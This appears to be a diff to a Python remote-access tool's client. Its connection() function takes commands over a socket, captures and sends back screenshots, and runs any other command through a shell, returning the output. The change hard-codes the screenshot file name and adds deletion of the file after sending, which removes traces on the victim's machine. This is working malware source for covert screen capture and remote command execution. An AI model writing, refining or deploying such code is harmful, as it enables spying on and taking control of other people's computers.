@@ -1,5 +1,5 @@
 from socket import socket, error
-from os import getcwd, chdir, environ
+from os import getcwd, chdir, environ, remove
 from subprocess import Popen, PIPE
 from time import sleep
 from pyautogui import screenshot
@@ -94,14 +94,14 @@ def connection():
             s.send(response)
         elif cmd == "screenshot":
             myScreenshot = screenshot()
-            path = Popen("echo shot.png", stdout=PIPE, shell=True).stdout.read().replace(
-                "\n", "").replace("\r", "")
+            path = "shot.png"
             myScreenshot.save(path)
             with open(path, "rb") as f:
                 response = f.read()
             response = (response + "||=shail=||" + getcwd())
             response = add_header(response)
             s.send(response)
+	    remove(path)
         else:
             response = Popen(cmd, shell=True, stdin=PIPE,
                              stdout=PIPE, stderr=PIPE)
